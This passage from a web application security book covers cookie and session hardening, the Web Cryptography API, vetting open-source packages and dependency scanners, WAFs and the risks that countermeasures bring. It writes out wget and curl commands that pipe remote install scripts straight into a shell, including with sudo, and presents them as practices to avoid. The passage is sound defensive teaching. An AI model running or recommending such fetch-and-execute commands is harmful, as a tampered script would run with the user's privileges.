             cookie.Secure = true;
	         /*
             www.owasp.org/index.php/Session_Management_Cheat_Sheet#Domain_and_Path_Attributes
             Cosider prefixing with the host.
	         */
             cookie.Domain = ".localtest.me";
             cookie.Path = "/";
    
             HttpResponseMessage response = new HttpResponseMessage();
             response.Headers.AddCookies(new CookieHeaderValue[] { cookie });
             response.Content = new StringContent(
                $"{{\"refreshToken\":\"{tokenResponse.RefreshToken}\"}}"
             );
             return response;
          }
       }
    }

MembershipReboot supports adding secret questions and answers along with the ability to update user account details. Details on how this can be done is in the [sample code](https://github.com/brockallen/BrockAllen.MembershipReboot/tree/master/samples) kindly provided by Brock Allen and documentation on their [github wiki](https://github.com/brockallen/BrockAllen.MembershipReboot/wiki#features).

#### Securing Sessions {#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-securing-sessions}

In the above example we (were constrained by a business requirement) chose to use cookies to carry the access token. Alternatively, the access token could be transported within the end user's HTTP response and request bodies, and stored in local storage.

Using local storage means that there is less to be concerned about in terms of protecting the token than with using cookies. Local storage concerns include XSS, whereas cookies are susceptible to both CSRF and XSS attacks (although XSS to a lesser degree). If you decided to use local storage, your anti-XSS strategy needs to be watertight.  
Even with the `HttpOnly` flag set on your cookie, it is possible to compromise the cookie contents if the values of the `Domain` and/or `Path` cookie attributes are too permissive. For example, if you have the `Domain` value set to `.localtest.me`, an attacker can attempt to launch attacks on the cookie token between other hosts with the same domain name. Some of these hosts may contain vulnerabilities, thereby increasing the attack surface.

![](images/SecuringSessions.png)

Set the [`Secure` attribute](https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Secure_Attribute) on the cookie. This instructs web browsers to only send the cookie over a TLS (HTTPS) connection, thereby removing the MItM attack vector.  
You can and should test this by inspecting the headers with an HTTP intercepting proxy. While you're at it, you may as well add this as a test to your Zap Regression Test suite as discussed in the Process and Practises chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com).

Turn the `HttpOnly` cookie flag on. This instructs the web browser to deny access to the cookie via JavaScript. The `Secure` flag must also be enabled as mentioned above, in order to mitigate Session Id theft.

CSRF is the most common attack used to leverage cookies containing authentication details. In order to mitigate this attack vector, the use of the synchroniser token pattern is recommended. Each server side technology will implement this type of protection differently. CSRF is discussed in more depth in the Cross-Site Request Forgery (CSRF) sections.

As per the `Expires` and `Max-Age` cookie attributes from  
`client\ServiceLayer\APIControllers\SecureController.cs` (seen above), these will need to be set to the maximum values that the business is prepared to accept, along with the `Client.AccessTokenLifetime` from `backend\Auth\AuthService.WebApi\IdSvr\Clients.cs` (seen above), which need to align for the IdentityServer.

The OWASP [Session Management Cheat Sheet](https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies) has more details around securing cookies.

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-countermeasures-cryptography-on-the-client}

![](images/ThreatTags/PreventionDIFFICULT.png)

There are fundamental principles that we need to examine, understand, and embrace before we dive into some details.

Attackers will always target the easiest point to compromise of any given encryption protocol.

Cryptography is one small ingredient that may go into creating a system which is aiming to be secure. Usually it is just easier to step around or by-pass any crypto. Think of crypto as just one defence. Unless all of your other areas of security are better than your crypto solutions, an attacker will more than likely target other weaker areas.

#### [Web Cryptography API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API) {#web-applications-countermeasures-cryptography-on-the-client-web-cryptography-api}

The Web Cryptography API has been implemented across browser vendors now.

[![](images/WebCryptoApi.png)](http://caniuse.com/cryptography)

> Above image from [http://caniuse.com/cryptography](http://caniuse.com/cryptography)  
> Licensed under [CC by 4.0](https://creativecommons.org/licenses/by/4.0/)  
Part of it was removed from the unsupported versions for Firefox, Chrome and Opera.

For those browsers still not up to speed, you can use a polyfill, although those are diminishing due to better browsers that support the Web Crypto API. Plus, the whole point of the Web Crypto API was to remove JavaScript crypto so that the underlying key(s) weren't accessible to JavaScript.

The browser is insecure, and should never be trusted. HTML5 has added a lot of extra attack surface without adding much in the way of security.

From the [W3C Web Cryptography API](https://dvcs.w3.org/hg/webcrypto-api/raw-file/tip/spec/Overview.html)  
"_The Web Crypto API defines a low-level interface to interacting with cryptographic key material that is managed or exposed by user agents_" but not exposed to the JavaScript application environment.

For starters:

* The user is untrusted, therefore their agent is untrusted
* The key is the only thing that needs to be, and should be secret and trustworthy. Everything else should be public
* If the key is managed by something that is untrusted (from the server's perspective), then the Web Crypto API is untrusted (from the server's perspective). Therefore, crypto in the browser cannot be trusted by the server, that is, if the server needs to trust it. 

The usual perspective in client/server relationships is that the server holds the single source of truth (the key). Crypto in the browser comes into the picture when the client holds the single source of truth. If the key is accessible to the JavaScript application environment (which it is if you are using your own JavaScript crypto or someone else's crypto libraries), then you're on very shaky ground. However, if we can hide this key away from the JavaScript application environment and have the browser expose an API, then we have a little more privacy.  

Relying on the Web Cryptography API as opposed to using low-level primitives provides a slightly better and more secure starting point. But it's only slightly better as discussed in the [Risks that Solution Causes](#web-applications-risks-that-solution-causes-cryptography-on-the-client) section.

In order, from the lowest to highest, the following Web Crypto API concepts need to be understood:

#### user agent

"_The specification assumes, but does not require, that conforming user agents do not and will not be directly implementing cryptographic operations within the user agent itself_" Often user agents will defer cryptographic operations to existing APIs available as part of the underlying operating system, or to third-party modules not directly managed by the user agent. As you can see, the responsibility doesn't belong to the server, but rather to the client or more specifically the end user.

#### `[[handle]]`

Internal slots and methods in the ECMA-262 (3, 5 and 6) standards are usually represented within "`[[`", "`]]`" in the ECMA-262 specifications. Internal slots and methods are pseudo-properties/pseudo-methods that the specification uses to define required state (for internal slots), behaviour (for internal methods). Internal slots and methods are hidden from user code, never exposed to applications. They may or may not correspond to properties of objects used by the engine and/or exposed via the implementation of the public API. The internal slot named `[[handle]]`, just as all other internal slots and methods, represents an opaque, implementation specific type. The `[[handle]]` slot contains whatever data the underlying cryptographic implementation uses to represent a logical key. So, in theory, the key material is never exposed to the JavaScript application environment, but rather via a user agent which manages or exposes to the internal `[[handle]]` slot.

#### `CryptoKey` (Web API interface)

"_The CryptoKey object represents an opaque reference to keying material that is managed by the user agent_"  
"_All CryptoKey objects have internal slots named [[type]], [[extractable]], [[algorithm]], [[algorithm\_cached]], [[usages]], [[usages\_cached]], and [[handle]]._" The CryptoKey object represents the bridge between the JavaScript execution environment and the underlying libraries, through the use of the internal slot named `[[handle]]`

A `CryptoKey` object can be obtained by using `SubtleCrypto.generateKey()`, `SubtleCrypto.deriveKey()` or `SubtleCrypto.importKey()`. See below for details on `SubtleCrypto`

Check the [specification](https://dvcs.w3.org/hg/webcrypto-api/raw-file/tip/spec/Overview.html#cryptokey-interface) for further details.

&nbsp;

#### The other two Web Crypto API interfaces

##### [`Crypto`](https://developer.mozilla.org/en-US/docs/Web/API/Crypto) (Web API interface)

The `Crypto` interface was implemented in some browsers without being well defined or cryptographically sound. Browsers implementing the Web Crypto API have removed the `Crypto` methods and properties other than `Crypto.subtle`. This provides access to the below `SubtleCrypto` interface, which provides all of the Web Crypto API methods.

Check the [specification](https://w3c.github.io/webcrypto/Overview.html#crypto-interface) for further details.

##### [`SubtleCrypto`](https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto) (Web API interface)

`SubtleCrypto` provides all the methods to work with the Web Crypto API.

Check the [specification](https://w3c.github.io/webcrypto/Overview.html#subtlecrypto-interface) for further details.

&nbsp;

Cryptography on the client does have its place. Use it in its designated place and in accordance with the standard. We know the server should never trust the client, but if the application is entirely on the client with no server needing to afford trust to the client, and the client doesn't want to trust the server, then it may be an option worth considering. If you consider how it may be abused at every point along the way, options do start to drop off quickly though. The following are some options that may suite the Web Crypto API:

#### Cloud Storage

This is one use case. In this scenario, the server doesn't need to trust the client. It receives data from the client, stores it and returns it. The user is exchanging their own data with themselves in the future. So long as the server never attempts to parse or execute it and the only browser that it may end up in is from the client that sent it to start with. The client is responsible for the key. The data is usually encrypted on the client, sent to the server encrypted, then fetched back to the client, and then finally decrypted again with the key that the client is responsible for.

#### Protected Data and Document Exchange

These concepts use a similar approach as the cloud storage, but the data doesn't necessarily have to ever touch the server. [Tresorit](https://tresorit.com) for example does a great job.

My preference is still for any crypto to be performed on the server where you have more control, less attack surface, and greater visibility.

### Consuming Free and Open Source {#web-applications-countermeasures-consuming-free-and-open-source}
![](images/ThreatTags/PreventionEASY.png)

I will be discussing this in a podcast show called "Attack Surface Reduction" for [Software Engineering Radio](http://www.se-radio.net/team/kim-carter/) with Natalie Silvanovich from the Google Project Zero Team, so keep an eye on [my shows](https://binarymist.io/publication/#4).

#### Process

Dibbe Edwards [discusses](https://soundcloud.com/owasp-podcast/dibbe-edwards-devops-and-open-source-at-ibm) some excellent initiatives on how they do it at IBM. I will attempt to paraphrase some of them here:

* Implement process and governance around which open source libraries you can use
* Legal review: checking licenses
* Scanning the code for vulnerabilities, manual and automated code review
* Maintain a list containing all the libraries that have been approved for use. If not on the list, make a request and it should go through the same process
* Once the libraries are in your product, they should become a part of your own code so that they are treated with the same rigour as any of your other in-house written code
* There needs to be an automated process that runs over the code base to check that nothing is included that is not on the approved list
* Consider automating some of the suggested tooling options below

There is an excellent paper by the SANS Institute on [Security Concerns in Using Open Source Software
for Enterprise Requirements](http://www.sans.org/reading-room/whitepapers/awareness/security-concerns-open-source-software-enterprise-requirements-1305), which is well worth a read. It confirms what the likes of IBM are doing in regards to their consumption of free and open source libraries.

#### Consumption is Your Responsibility

As a developer, you are responsible for what you install and consume. [Malicious NodeJS packages](https://github.com/joaojeronimo/rimrafall) do end up on NPM from time to time. The same goes for any source or binary you download and run. The following commands are often encountered as being "the way" to install things:

{title="wget", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    sh -c "$(wget https://raw.github.com/account/repo/install.sh -O -)"

{title="curl", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    sh -c "$(curl -fsSL https://raw.github.com/account/repo/install.sh)"

Below is the [official way](https://github.com/nodesource/distributions) to install NodeJS. Do not do this. `wget` or `curl` first, then make sure what you have just downloaded is not malicious.

A>
A> Inspect the code before you run it.
A>

1. The repository could have been tampered with
2. The transmission from the repository to you could have been intercepted and modified

{title="curl", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -
    sudo apt-get install -y nodejs

#### Keeping Safe

##### wget, curl, etc

Please do not `wget`, `curl` or fetch in any way and pipe what you think is an installer or any script to your shell without first verifying what you are about to run is not malicious. Do not download and run in the same command.

The better option is to:

1. Verify the source that you are about to download, if all good
2. Download it
3. Check it again, if all good
4. Only then should you run it

##### npm install

As part of an `npm install`, package creators, maintainers (or even a malicious entity intercepting and modifying your request on the [wire](#network-identify-risks-wire-inspecting)) can define scripts to be run on specific [NPM hooks](https://docs.npmjs.com/misc/scripts). You can check to see if any package has hooks (before installation) that will run scripts by issuing the following command:  
`npm show [module-you-want-to-install] scripts`

Recommended procedure:

1. Verify the source that you are about to download, and if it is good;
2. `npm show [module-you-want-to-install] scripts`
3. Download the module without installing it and inspect it. You can download it from `http://registry.npmjs.org/[module-you-want-to-install]/-/[module-you-want-to-install]-VERSION.tgz`

The most important step here is downloading and inspecting before you run.

##### Doppelganger Packages {#web-applications-countermeasures-consuming-free-and-open-source-keeping-safe-doppelganger-packages}

As with [Doppelganger Domains](#network-identify-risks-doppelganger-domains), people often mistype what they want to install. There is likely someone who wants to do something malicious such as have consumers of your package destroy or modify their systems, send sensitive information to you, or any number of other malicious activities (ideally identified in the [Identify Risks](#web-applications-identify-risks-consuming-free-and-open-source) section). Doppelganger packages are an excellent avenue for increased likelihood that someone will install your malicious package by mistyping the name of it with the name of another package that has a very similar name. I covered this in my ["0wn1ng The Web"](https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com) presentation, with demos.

Make sure you are typing the correct package name. Copy -> Pasting works.

##### [Whitelisting Packages](https://npme.npmjs.com/docs/workflow/whitelisting.html) via npm Enterprise

Reviewing, and deciding as an organisation, which packages you allow your developers to consume is another good safety measure. Yes, it means someone has to do the reviewing, but partly relying on the vetting that the tooling and other options discussed in this section can make this process quicker. Then, via the Enterprise admin console, set `Read through cache` to `Off` so that only whitelisted packages can be fetched.

Whitelisted packages are those that are added to the Enterprise instance with:  
`npme add-package <packagename>`

#### Tooling {#web-applications-countermeasures-consuming-free-and-open-source-tooling}

For **NodeJS developers**: Keep your eye on the [nodesecurity advisories](https://nodesecurity.io/advisories). Identified security issues can be posted to [NodeSecurity report](https://nodesecurity.io/report).

Tooling for JavaScript package security defects is moving quickly, although the below was correct at the time of writing, things may have progressed further.

##### [npm-outdated](https://docs.npmjs.com/cli/outdated)

Simply check the NPM registry to see if any of your installed or specific packages are currently out of date.

Running the following command in your application directory:  
`npm outdated`  
It may produce output like the following:

{title="npm-outdated", linenos=off}
    Package               Current  Wanted  Latest  Location
    body-parser            1.13.3  1.15.2  1.15.2  body-parser
    config                 1.15.0  1.21.0  1.21.0  config
    errorhandler            1.4.2   1.4.3   1.4.3  errorhandler
    express                4.13.3  4.14.0  4.14.0  express
    express-form           0.12.4  0.12.6  0.12.6  express-form
    jade                   0.30.0  0.30.0  1.11.0  jade
    less-middleware        0.1.11  0.1.11   2.1.0  less-middleware
    method-override         2.3.5   2.3.6   2.3.6  method-override
    morgan                  1.6.1   1.7.0   1.7.0  morgan
    nodemailer              1.4.0  1.11.0   2.4.2  nodemailer
    winston                 1.0.1   1.1.2   2.2.0  winston
    winston-email          0.0.10  0.0.10  0.0.11  winston-email
    winston-syslog-posix    0.1.5   0.1.5   1.1.0  winston-syslog

* `Wanted` is the maximum version of the package that satisfies the semantic versioning range specified in `package.json`
* `latest` is the version of the package tagged as latest in the registry.

##### [npm-check](https://www.npmjs.com/package/npm-check)

npm-check is a similar tool to npm-outdated, but provides more information and an API is useful for using in a CI tool-chain. npm-check can also inform you of missing or packages that are not currently being used.

##### [David](https://david-dm.org/)

David uses your `package.json` file in your NodeJS project to check whether your dependencies are up to date and that no known vulnerabilities are found. You embed a badge on your Github page giving immediate feedback, which links to a page with details of any issues for your dependencies.

##### [RetireJS](https://github.com/RetireJS/retire.js)

RetireJS is useful to help you find JavaScript libraries with known vulnerabilities.  
RetireJS has the following:

1. Command line scanner
    * Excellent for CI builds. Include it in one of your build definitions and let it do the work for you.
      * To install globally:  
      `npm i -g retire`
      * To run it over your project:  
      `retire my-project`  
      Results like the following may be generated:

        {linenos=off}
            public/plugins/jquery/jquery-1.4.4.min.js
            ↳ jquery 1.4.4.min has known vulnerabilities:
            http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-4969
            http://research.insecurelabs.org/jquery/test/
            http://bugs.jquery.com/ticket/11290

    * To install RetireJS locally to your project and run as a git `precommit-hook`.  
    There is an NPM package that can help us with this, called `precommit-hook`, which installs the git `pre-commit` hook into the usual `.git/hooks/pre-commit` file of your projects repository. This allows us to run any scripts immediately before a commit is issued.  
    Install both packages locally and save to `devDependencies` of your `package.json`. This will make sure that when other team members fetch your code, the same `retire` script will be run on their `pre-commit` action.
    
      {linenos=off}
          npm install precommit-hook --save-dev
          npm install retire --save-dev
        
      If you do not configure the hook via the `package.json` to run specific scripts, it will run `lint`, `validate` and `test` by default. See the RetireJS documentation for options.
    
      {linenos=off, lang=JavaScript}
          {
             "name": "my-project",
             "description": "my project does wiz bang",
             "devDependencies": {
                "retire": "~0.3.2",
                "precommit-hook": "~1.0.7"
             },
             "scripts": {
                "validate": "retire -n -j",
                "test": "a-test-script",
                "lint": "jshint --with --different-options"
             }
          }
        
      Adding the `pre-commit` property allows you to specify which scripts you want run before a successful commit is performed. The following `package.json` defines that the `lint` and `validate` scripts will be run. `validate` runs our `retire` command.
    
      {linenos=off, lang=JavaScript}
          {
             "name": "my-project",
             "description": "my project does wiz bang",
             "devDependencies": {
                "retire": "~0.3.2",
                "precommit-hook": "~1.0.7"
             },
             "scripts": {
                "validate": "retire -n -j",
                "test": "a-test-script",
                "lint": "jshint --with --different-options"
             },
             "pre-commit": ["lint", "validate"]
          }
        
      Keep in mind that `pre-commit` hooks can be very useful for all sorts of checking of things immediately before your code is committed. For example, running [security regression tests](https://github.com/binarymist/NodeGoat/wiki/Security-Regression-Testing-with-Zap-API) mentioned previously in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com) with the OWASP ZAP API, as demonstrated here: [https://youtu.be/DrwXUOJWMoo](https://youtu.be/DrwXUOJWMoo).
2. Chrome extension
3. Firefox extension
4. Grunt plugin
5. Gulp task
6. Burp and OWASP ZAP plugin
7. [On-line tool](http://retire.insecurity.today/): you can simply enter your web applications URL and the resource will be analysed

##### requireSafe

requireSafe provides "_intentful auditing as a stream of intel for bithound_". Last time I spoke with [Adam Baldwin](https://twitter.com/adam_baldwin) this project was moving slowly. From all the redirects I'm seeing, it appears to have been consumed into Node Security Platform (NSP).

##### [bithound](https://www.bithound.io/)

According to the Bithound Github, there doesn't appear to be much activity on this project currently, which may make sense as requireSafe appears to have been moved to NSP.

In regards to NPM packages, we know the following things:

1. There is a small collection of vulnerable NPM packages, some of which have high dependency counts.
2. The vulnerable packages have published patched versions
3. Many packages are still consuming the vulnerable unpatched versions of packages that have published patched versions
  * Although we could have removed a much larger number of vulnerable packages due to their continued dependence on unpatched packages, we have not. I think this mostly comes down to lack of visibility, awareness, and education. This is exactly what I'm trying to change.

bithound supports:

* JavaScript, TypeScript and JSX (back-end and front-end)
* In terms of version control systems, only git is supported
* Opening of bitbucket and github issues
* Providing statistics on code quality, maintainability and stability. I queried Adam on this, but not a lot of information was forth coming.

bithound can be configured to not analyse some files. Very large repositories are prevented from being analysed due to large scale performance issues.

It analyses both NPM and Bower dependencies and notifies you if any are:

* Out of date
* Insecure. I assume this is based on the known vulnerabilities (41 node advisories at the time of writing this)
* Unused

Analysis of opensource projects is free.

##### [Node Security Platform](https://nodesecurity.io/) (NSP)

NSP at the time of writing is quite popular. It provides Github pull request integration, it has a Code Climate Node Security Engine. Code Climate was discussed briefly in the "Linting, Static Analysis" section of "Code Review" in the Process and Practises chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). It also has a CLI, so it is CI friendly.

You can install the NSP CLI like:  
`npm install -g nsp`  
To find out what nsp gives you:  
`nsp --help`  
To run a check, cd into your application directory and:  
`nsp check`  
Any known vulnerabilities present will be printed.

There is also a:

1. gulp plugin (`gulp-nsp`) which can be used to check all dependencies listed in your `package.json` or `shrinkwrap.json`.
2. Visual Studio Code plugin that can run the NSP audit from within the editor. To install, open a command prompt with `Ctrl+Shift+C` and run the following command:  
`ext install vscode-nsp`

It was announced on April 10, 2018 that NPM had acquired NSP.

##### [Snyk](https://snyk.io)

Snyk has a fairly similar feature set to NSP, plus more, such as:

* Email notifications for new vulnerabilities and fixes
* Customisation of the severity level at which the tests should fail
* Automatically create Github pull requests to fix the vulnerability
* Snyk for [Serverless](https://snyk.io/serverless)

The pricing model seems a little steep for non-opensource projects.

%% https://snyk.io/blog/github-integration/

##### [Github](https://blog.github.com/2017-11-16-introducing-security-alerts-on-github/)

Github announced in November, 2017 that they now had a feature for tracking your dependencies with known security vulnerabilities, providing they have CVEs, this may be extended in the future.

&nbsp;

For **.Net developers**, there is the likes of [OWASP **SafeNuGet**](https://github.com/OWASP/SafeNuGet).  
OWASP [DependencyCheck](https://www.owasp.org/index.php/OWASP_Dependency_Check) also notifies of known publicly disclosed vulnerabilities in Java and .Net, with experimental support for Ruby, Node.js and Python. I haven't used DependencyCheck, as it produces [false positives and false negatives](https://jeremylong.github.io/DependencyCheck/).

### Insufficient Attack Protection {#web-applications-countermeasures-insufficient-attack-protection}
![](images/ThreatTags/PreventionEASY.png)

[Insecure Direct Object References](https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References) were part of the OWASP Top 10 in 2013, which in 2017 was [merged](https://www.owasp.org/index.php/Top_10_2017-Release_Notes) into [Insufficient Attack Protection](https://www.owasp.org/index.php/Top_10_2017-A7-Insufficient_Attack_Protection). OWASP has good guidance on this.

#### Web Application Firewall (WAF) {#web-applications-countermeasures-insufficient-attack-protection-waf}

[WAFs](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#wafs) are similar to Intrusion Prevention Systems (IPS) except that they operate at the [Application Layer](http://en.wikipedia.org/wiki/Application_layer)(HTTP), Layer 7 of the [OSI model](http://en.wikipedia.org/wiki/OSI_model). They understand the concerns of your web application at a technical level. WAFs protect your application against a large number of attacks, such as XSS, CSRF, SQLi, [Local File Inclusion (LFI)](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion), session hijacking, invalid requests (requests to things that do not exist (think 404)). WAFs sit inline between a gateway and the web application. They run as a proxy, either on the physical web server, or on another network node, but only the traffic directed to the web application is inspected, whereas an IDS/IPS inspects all network traffic passed through its interfaces. WAFs use signatures that look like specific vulnerabilities to compare the network traffic targeting the web application and apply the associated rule(s) when matches are detected. WAFs are not limited to dealing with known signatures, some can detect and prevent attacks that they have not seen before such as responses containing larger-than-specified payloads. The source code of the web application does not have to be modified.

1. [Fusker](https://www.npmjs.com/package/fusker). I am not sure if this is still actively maintained. At this point, there have not been any recent commits since 2012, but it does look like the best offering we have at this stage for NodeJS.
2. [express-waf](https://www.npmjs.com/package/express-waf) was last committed to in 2015. There was only one developer working on it when I checked
3. Many cloud providers also have other offerings, such as [AWS WAF](https://aws.amazon.com/waf/). They can provide some assistance in mitigating generic injection, XSS, and DoS attacks and provide an API useful for the automation, creation, and deployment of web security rules

#### Application Intrusion Detection and Response

You can think of this as taking a WAF one step closer to your application, in fact, integrating it with your application and augmenting your application with logic to detect and respond to threats.

[AppSensor](http://appsensor.org/) brings detection -> prevention to the domain level. Most applications today just absorb attacks, then tip over. I have heard so many times that we want our applications to fail securely when they receive bad input.
We don't want them to fail at all in production, but rather defend themselves.

Technically AppSensor is not a WAF because the concepts are used to shape your application logic.

The project defines a conceptual framework and method that offers prescriptive guidance to implement intrusion detection and automated response into your applications, thus providing attack awareness baked in, with real-time defences.

AppSensor provides > 50 (signature based) detections and provides guidance on how to respond once an attack is identified. Possible actions include:

* logging out the user
* locking the account or notifying an administrator
* more than a dozen response actions are described.

At the time of writing the sample code is only Java. The documentation is well worth checking out though, which I have added in the [Additional Resources](#additional-resources-countermeasures-insufficient-attack-protection-application-intrusion-detection-and-response) chapter.

#### Active Automated Prevention

The application should recognise unusual requests. Automated scanning should be distinguishable from normal traffic.

You, as the application administrator, have the upper hand when it comes to actively defending against attackers. This can be done by creating behaviours that respond to specific out-of-the-ordinary requests with misleading feedback and/or behaviour that builds the attacker's confidence, and ultimately wastes their time.

When spending the attacker's budget for them, you are ultimately depleting their resources, which causes them to make silly mistakes, be caught, and/or just run out of time.

## 4. SSM Risks that Solution Causes {#web-applications-risks-that-solution-causes}

Often, when there is an increase in security, there is a related increase in confidence. Increased confidence is a weakness in itself, along with the fact that it brings with it other vulnerabilities. The more you know, the more you need to be aware of how vulnerable you are.

### Lack of Visibility

With added visibility, you will have to make decisions based on the new found information you now have. No more blissful ignorance that you enjoyed before.

#### Insufficient Logging and Monitoring

There will be increased learning, and work to be done, to become familiar with libraries and tooling. Code will have to be written for logging such as wrapping libraries, initialising and adding logging statements, or hiding them using AOP.

Instrumentation will have to be placed in your code, again another excellent candidate for AOP.

### Lack of Input Validation, Filtering and Sanitisation

You may have to invest a considerable amount of time yourself to gain good understanding into what can go wrong. Where, how, and how to mitigate it when it happens. Be inquisitive and experiment.

There will be more code in your systems. The more code there is, the more likely the code will have faults.

Be very careful with sanitisation. Try first to use well tested and battle hardened libraries. Resist going out on your own to modify or create sanitisation routines. They are very easy to miss edge cases and small areas that your untrusted data may hide in and that you did not anticipate. This will leave you susceptible to an attack.

#### Cross-Site Scripting (XSS)

Covered above.

### Cross-Site Request Forgery (CSRF)

Catering to CSRF can be daunting and it is difficult to cover every possible attack vector. If possible, I usually try and avoid session cookies all together and use localstorage instead. Then I just need to make sure my XSS countermeasures strategy is watertight, which is a bit simpler. If you are constrained to use cookies for your session identifiers, make sure you research both risks and countermeasures thoroughly. With the material I have provided along with the additional resources, you should be in good stead.

### Injection

As with all code review, it can be costly, therefore, you need to weigh the cost of reviewing the code versus the cost to you and your customers when exploited, i.e. losing the assets we have discussed.

Avoiding the use of external interpreters means you will have to do the interpreting yourself, or you will have to be more thorough in performing other countermeasures.

Occasionally, finding a parametrised API for your use case can be a challenge.

Going through the process of defining your semantic types can take some time, which often causes stakeholders to think about things they may have glossed over. Working through validation, filtering, and sanitisation can be time consuming.

Making sure you embrace least privilege will also more than likely take you some time. Again, this cost needs to be weighed.

Making sure that the system is not revealing unnecessary information that could aid an attacker in their understanding of your systems internals will mean some testing, and probably doing a code review will be necessary. This will take time.

#### SQLi

If you have a legacy system with SQLi issues, then you will need to invest the time to fix them. 

#### NoSQLi {#web-applications-risks-that-solution-causes-nosqli}

One potential risk that I see is that developers don't understand the particular NoSQL data store they are using. As I mentioned, the 225+ data stores all do things differently, you will need to understand their APIs, what they do well, and do not do well. Read the documentation, if the documentation is poor, consider using something else. If that is out of the question, dive into the implementation and work out what you need to do from that.

#### Command Injection

Reviewing code, testing and making the changes costs money.

#### XML Injection

Time to determine what you are currently doing wrong, and what you can do better.

#### XSLT Injection

Time to review, test, and apply countermeasures.

#### XPath Injection

Time to review, test, and apply countermeasures.

#### XQuery Injection

Time to review, test, and apply countermeasures.

#### LDAP Injection

Time to review, test, and apply countermeasures.

### Captcha

Bots may/will get smarter and start reading and thinking for themselves. That said, it is probably not worth crossing that bridge until it arrives. This will not stop humans spamming, but neither will any other captcha, unless they also stop genuine users which, according to the studies mentioned in the countermeasures section, happens very often.

If you decide to go with one of the captcha options, there is the risk of:

1. Losing customers or potential customers
2. Simply annoying the people that you value
3. Creating/using a captcha that does not suit the capabilities of the legitimate users likely to interact with your web application

### Management of Application Secrets

Reliance on adjacent layers of defence means those layers have to be up to snuff. There is a possibility that they will not be.

There is the possibility of missing secrets being sent over the wire.

Possible reliance on obscurity with many of the strategies I have seen proposed. Just be aware that obscurity may slow an attacker down a little, but it will not stop them.

#### Store Configuration in Configuration files

When moving any secrets from source code to configuration files, there is a possibility that the secrets will not be changed at the same time. If they are not changed, then you have not really helped much, as the secrets are still in source control.

With good configuration tools such as node-config, you are provided with plenty of options of splitting up metadata, creating overrides, storing different parts in different places, etc. though there is a risk that you do not use the potential power and flexibility to your best advantage. Learn the ins and outs of what ever system it is you are using and leverage its features to do the best at obscuring your secrets and, if possible, securing them.

##### node-config

node-config is an excellent configuration package with lots of great features. There is no security provided with node-config, just some potential obscurity. Just be aware of that, and as discussed previously, make sure surrounding layers have beefed up security.

##### Windows:

As is often the case with Microsoft solutions, their marketing often leads people to believe that they have secure solutions to problems when that is not the case. As discussed previously, there are plenty of ways to get around Microsoft security features. As anything else in this space, they may provide some obscurity, but do not depend on them being secure.

Statements such as the following have the potential for producing excessive confidence:

"_vSentry protects desktops without requiring patches or updates, defeating and automatically discarding all known and unknown malware, and eliminating the need for costly remediation._"

Please keep your systems patched and updated.

"_With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use_"

There is a risk that people will believe this.

%% t0x0 mentioned: Cred Guard was one thing. Others were EMET, https://support.microsoft.com/en-nz/kb/2458544 and PAWS https://technet.microsoft.com/en-us/library/mt634654.aspx

##### Linux:

As with Microsoft's "virtualisation-based security" Linux containers may slow system compromise down, but a determined attacker will find other ways to get around container isolation. Maintaining a small set of user accounts is a worthwhile practise, but that alone will not be enough to stop a highly skilled and determined attacker moving forward.  
Even when technical security is very good, an experienced attacker will use other mediums to gain what they want, such as social engineering and physical vectors as discussed in the People and Physical chapters of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com), and other attack vectors listed in this book. Defence in depth is crucial in achieving good security. Concentrate on the lowest hanging fruit first and working your way up the tree.

Locking file permissions and ownership down is good, but that alone will not save you. 

#### Least Privilege

Applying least privilege to everything can take quite a bit of work. Yes, it is probably not that hard to do, but does require a breadth of thought and time. Some of the areas discussed could be missed. Having more than one person working on the task is often effective as each person can bounce ideas off each other and the other person is likely to notice areas that you may have missed and visa-versa.

#### Location

Segmentation is useful, and a common technique in helping to build resistance against attacks. It does introduce some complexity though. With complexity comes the added likelihood of introducing a fault. 

#### Datastore Compromise

If you follow the advice in the [countermeasures](#web-applications-countermeasures-data-store-compromise) section, you will be doing more than most other organisations in this area. It is not hard, but if implemented, it could increase complacency/overconfidence. Always be on guard. Always expect that, although you have done a lot to increase your security stance, a determined and experienced attacker is going to push buttons you may have never realised you had. If they want something enough, and have the resources and determination to get it, they probably will. This is where you need to put strategies in place to deal with post-compromise. Create processes (ideally partly automated) to deal with theft.

Also consider that once an attacker has made off with your datastore, even if it is currently infeasible to bruteforce the secrets, there may be other ways around obtaining the missing pieces of information they need. Think about paper shredders as discussed in the Physical chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com) and the associated [competitions](http://archive.darpa.mil/shredderchallenge/). With patience, most puzzles can be cracked. If the compromise is an opportunistic type of attack, they will most likely just give up and seek an easier target. If it is a targeted attack by determined and experienced attackers, they will probably try other attack vectors until they get what they want.

Do not let overconfidence be your weakness. An attacker will search out the weakest link. Do your best to remove weak links.

### Lack of Authentication, Authorisation and Session Management {#web-applications-risks-that-solution-causes-lack-of-authentication-authorisation-and-session-management}

This is a complex topic with many areas that the developer must understand in order to make the best decisions. Having team members that already have strengths in these areas can help a lot. The technologies are moving fast, but many of the concepts encountered are similar across technology generations. It helps to have a healthy fear, some experience with what can go wrong, and an understanding of just how many concepts must be understood in order to piece together a solution that is going to work well, and resist attacks.

